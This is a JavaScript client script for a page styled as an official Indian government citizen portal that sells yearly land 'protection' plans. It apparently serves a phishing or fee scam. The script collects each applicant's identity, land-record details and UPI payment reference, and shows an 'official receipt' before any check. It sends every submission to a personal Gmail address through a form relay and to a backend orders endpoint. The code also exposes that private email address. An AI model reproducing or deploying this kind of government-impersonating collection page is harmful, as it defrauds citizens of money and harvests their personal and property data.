/**
 * ज़मीन सेवा केंद्र (ZAMEEN SEVA KENDRA) — Official Citizen Portal Client Script
 * Lightweight, Clean, High-Trust Form & Plan Controller
 */

// Selected Plan State: 'RESIDENT_2999' or 'NRI_120USD'
let activePlan = 'RESIDENT_2999';

document.addEventListener('DOMContentLoaded', () => {
  initLiveDate();
});

// 1. Live Date Display in Government Header
function initLiveDate() {
  const dateEl = document.getElementById('liveDateTime');
  if (!dateEl) return;
  const now = new Date();
  const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
  try {
    dateEl.textContent = now.toLocaleDateString('hi-IN', options);
  } catch (e) {
    dateEl.textContent = now.toLocaleDateString('en-IN', options);
  }
}

// 2. Plan Selection & Smooth Scroll
function selectPlanAndScroll(planKey) {
  setFormPlan(planKey);
  const enrollSection = document.getElementById('enrollSection');
  if (enrollSection) {
    enrollSection.scrollIntoView({ behavior: 'smooth' });
  }
}

// 3. Form Plan Switcher (Resident vs NRI)
function setFormPlan(planKey) {
  activePlan = planKey;
  const labelResident = document.getElementById('labelRadio2999');
  const labelNRI = document.getElementById('labelRadioNRI');
  const radioResident = document.getElementById('radioResident');
  const radioNRI = document.getElementById('radioNRI');
  const boxDomestic = document.getElementById('paymentBoxDomestic');
  const boxNRI = document.getElementById('paymentBoxNRI');
  const submitBtn = document.getElementById('submitEnrollBtn');

  if (planKey === 'RESIDENT_2999') {
    if (labelResident) labelResident.classList.add('selected');
    if (labelNRI) labelNRI.classList.remove('selected');
    if (radioResident) radioResident.checked = true;
    if (boxDomestic) boxDomestic.style.display = 'flex';
    if (boxNRI) boxNRI.style.display = 'none';
    if (submitBtn) {
      submitBtn.innerHTML = '<span>🛡️</span><span>भूमि सुरक्षा पंजीकरण पूर्ण करें — ₹2,999/वर्ष (Submit Enrollment)</span>';
    }
  } else {
    if (labelResident) labelResident.classList.remove('selected');
    if (labelNRI) labelNRI.classList.add('selected');
    if (radioNRI) radioNRI.checked = true;
    if (boxDomestic) boxDomestic.style.display = 'none';
    if (boxNRI) boxNRI.style.display = 'flex';
    if (submitBtn) {
      submitBtn.innerHTML = '<span>🌍</span><span>Enroll in NRI Sentinel Shield — $120/Year</span>';
    }
  }
}

// 4. Form Submission & Official Receipt Display
async function handleEnrollmentSubmit(e) {
  e.preventDefault();

  const applicantName = document.getElementById('applicantName').value.trim();
  const applicantPhone = document.getElementById('applicantPhone').value.trim();
  const applicantEmail = document.getElementById('applicantEmail').value.trim();
  const landDistrict = document.getElementById('landDistrict').value.trim();
  const landTehsil = document.getElementById('landTehsil').value.trim();
  const landVillage = document.getElementById('landVillage').value.trim();
  const landKhasra = document.getElementById('landKhasra').value.trim();
  const utr = document.getElementById('paymentUtr') ? document.getElementById('paymentUtr').value.trim() : '';

  if (!applicantPhone || !landKhasra) {
    showGovAlert('कृपया <strong>मोबाइल नंबर</strong> और <strong>गाटा/खसरा संख्या</strong> अवश्य भरें।', 'अधूरी जानकारी (Incomplete Form)');
    return;
  }

  if (activePlan === 'RESIDENT_2999' && !utr) {
    showGovAlert(
      'कृपया QR कोड स्कैन करके <strong>₹2,999</strong> का भुगतान करें और बैंक/UPI ऐप (GPay, PhonePe, Paytm) से प्राप्त <strong>12-अंकों का UPI UTR / Transaction No.</strong> यहाँ दर्ज करें।',
      '⚠️ भुगतान सत्यापन सूचना (Payment Verification Required)',
      () => {
        const utrInput = document.getElementById('paymentUtr');
        if (utrInput) {
          utrInput.focus();
          utrInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }
    );
    return;
  }

  const submitBtn = document.getElementById('submitEnrollBtn');
  const planName = activePlan === 'RESIDENT_2999' ? 'ANNUAL_2999' : 'NRI_120USD';
  const amount = activePlan === 'RESIDENT_2999' ? 2999 : 120;
  const instantRegId = 'ZSK_' + new Date().getFullYear() + '_' + Math.floor(10000 + Math.random() * 90000);

  // 1. INSTANT UI SUCCESS FEEDBACK (0 Milliseconds - Never keep citizen waiting!)
  document.getElementById('rcptOrderId').textContent = instantRegId;
  document.getElementById('rcptName').textContent = applicantName;
  document.getElementById('rcptGata').textContent = `गाटा #${landKhasra}`;
  document.getElementById('rcptLocation').textContent = `${landVillage}, ${landTehsil} (${landDistrict})`;
  document.getElementById('rcptPlan').textContent = activePlan === 'RESIDENT_2999' 
    ? '₹2,999 / वर्ष (भारतीय निवासी सुरक्षा कवच)' 
    : '$120 / Year (NRI Overseas Land Guard)';
  document.getElementById('rcptPhone').textContent = applicantPhone;
  const rcptUtr = document.getElementById('rcptUtr');
  if (rcptUtr) {
    rcptUtr.textContent = utr || (activePlan === 'RESIDENT_2999' ? 'Pending Bank Verification' : 'NRI Overseas Verification');
  }

  // Switch display immediately
  document.getElementById('enrollmentForm').style.display = 'none';
  const receiptCard = document.getElementById('officialReceiptCard');
  receiptCard.style.display = 'block';
  receiptCard.scrollIntoView({ behavior: 'smooth' });

  // Reset submit button state
  if (submitBtn) {
    submitBtn.disabled = false;
    setFormPlan(activePlan);
  }

  // Clean form fields immediately in background so it's fresh for next user
  clearEnrollmentForm();

  // 2. BACKGROUND ASYNC EMAIL & ORDER DISPATCH (Non-blocking)
  // Direct client HTTPS email dispatch to amitcse21@gmail.com
  fetch('https://formsubmit.co/ajax/amitcse21@gmail.com', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify({
      _subject: `🚨 [नया पंजीकरण Alert] गाटा #${landKhasra} — ${applicantName} (${activePlan === 'RESIDENT_2999' ? '₹2,999' : '$120'})`,
      _template: 'table',
      'पंजीकरण संख्या (Reg ID)': instantRegId,
      'आवेदक का नाम (Name)': applicantName,
      'व्हाट्सएप / फोन (Phone)': applicantPhone,
      'ईमेल (Email)': applicantEmail || 'N/A',
      'गाटा / खसरा संख्या (Gata)': `गाटा #${landKhasra}`,
      'ग्राम / मौजा (Village)': landVillage,
      'तहसील (Tehsil)': landTehsil,
      'जनपद / जिला (District)': landDistrict,
      'सुरक्षा योजना (Plan)': activePlan === 'RESIDENT_2999' ? '₹2,999 / वर्ष (भारतीय निवासी सुरक्षा कवच)' : '$120 / Year (NRI Sentinel)',
      'फीस राशि (Amount)': activePlan === 'RESIDENT_2999' ? '₹2,999' : '$120',
      'UPI UTR / Ref No': utr || 'Pending / N/A',
      'पंजीकरण समय (Time IST)': new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
    })
  }).catch(err => {
    console.log('Client mail notification notice:', err);
  });

  // Background server order creation & SMTP dispatch
  fetch('/api/orders/create', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      customerName: applicantName,
      phone: applicantPhone,
      email: applicantEmail,
      district: landDistrict,
      tehsil: landTehsil,
      village: landVillage,
      khasraNo: landKhasra,
      plan: planName,
      amount: amount,
      utr: utr,
      notes: `Email: ${applicantEmail} | Registered via Official Citizen Portal`
    })
  }).then(res => res.json()).then(data => {
    if (data && data.success && data.order && data.order.id) {
      document.getElementById('rcptOrderId').textContent = data.order.id;
    }
  }).catch(err => {
    console.log('Background order sync notice:', err);
  });
}

// 5. Utility: Thoroughly Clear All Form Fields
function clearEnrollmentForm() {
  const form = document.getElementById('enrollmentForm');
  if (form) {
    form.reset();
  }

  // Clear all form inputs, textareas, selects
  const allInputs = document.querySelectorAll('#enrollmentForm input, #enrollmentForm textarea, #enrollmentForm select');
  allInputs.forEach(input => {
    if (input.type === 'radio') {
      input.checked = (input.id === 'radioResident');
    } else if (input.type !== 'submit' && input.type !== 'button') {
      input.value = '';
      input.defaultValue = '';
      input.removeAttribute('value');
    }
  });

  const specificIds = [
    'applicantName',
    'applicantPhone',
    'applicantEmail',
    'landDistrict',
    'landTehsil',
    'landVillage',
    'landKhasra',
    'paymentUtr'
  ];
  specificIds.forEach(id => {
    const el = document.getElementById(id);
    if (el) {
      el.value = '';
      el.defaultValue = '';
      el.removeAttribute('value');
    }
  });

  setFormPlan('RESIDENT_2999');
}

// 6. Start New Enrollment (Completely Clears & Resets the Form)
function startNewEnrollment() {
  clearEnrollmentForm();

  // Hide receipt card and display empty enrollment form
  const receiptCard = document.getElementById('officialReceiptCard');
  if (receiptCard) {
    receiptCard.style.display = 'none';
  }

  const form = document.getElementById('enrollmentForm');
  if (form) {
    form.style.display = 'block';
  }

  // Smooth scroll back to form
  const enrollSection = document.getElementById('enrollSection');
  if (enrollSection) {
    enrollSection.scrollIntoView({ behavior: 'smooth' });
  }

  // Automatically focus on the first input
  setTimeout(() => {
    const nameInput = document.getElementById('applicantName');
    if (nameInput) {
      nameInput.focus();
    }
  }, 250);
}

// Expose globally to window
window.startNewEnrollment = startNewEnrollment;
window.clearEnrollmentForm = clearEnrollmentForm;

// 6. FAQ Accordion
function toggleFaq(questionEl) {
  const answer = questionEl.nextElementSibling;
  const arrow = questionEl.querySelector('span:last-child');
  if (answer.style.display === 'none' || answer.style.display === '') {
    answer.style.display = 'block';
    if (arrow) arrow.textContent = '▴';
  } else {
    answer.style.display = 'none';
    if (arrow) arrow.textContent = '▾';
  }
}

// Language toggle helper
let currentLang = 'hi';
const langToggleBtn = document.getElementById('langToggleBtn');
if (langToggleBtn) {
  langToggleBtn.addEventListener('click', () => {
    currentLang = currentLang === 'hi' ? 'en' : 'hi';
    document.getElementById('langBtnText').textContent = currentLang === 'hi' ? 'English' : 'हिंदी';
    document.documentElement.lang = currentLang;
  });
}

// Custom Government-Style Alert Modal (No browser alert)
function showGovAlert(messageHtml, title = 'आवश्यक सूचना (Information Required)', onConfirm = null) {
  const modal = document.getElementById('govAlertModal');
  const titleEl = document.getElementById('govModalTitle');
  const msgEl = document.getElementById('govModalMessage');
  const btn = document.getElementById('govModalCloseBtn');

  if (titleEl) titleEl.textContent = title;
  if (msgEl) msgEl.innerHTML = messageHtml;
  if (modal) modal.style.display = 'flex';

  if (btn) {
    btn.onclick = () => {
      if (modal) modal.style.display = 'none';
      if (typeof onConfirm === 'function') {
        onConfirm();
      }
    };
  }
}

// Global Window Exports
window.handleEnrollmentSubmit = handleEnrollmentSubmit;
window.setFormPlan = setFormPlan;
window.selectPlanAndScroll = selectPlanAndScroll;
window.showGovAlert = showGovAlert;
window.startNewEnrollment = startNewEnrollment;
window.clearEnrollmentForm = clearEnrollmentForm;
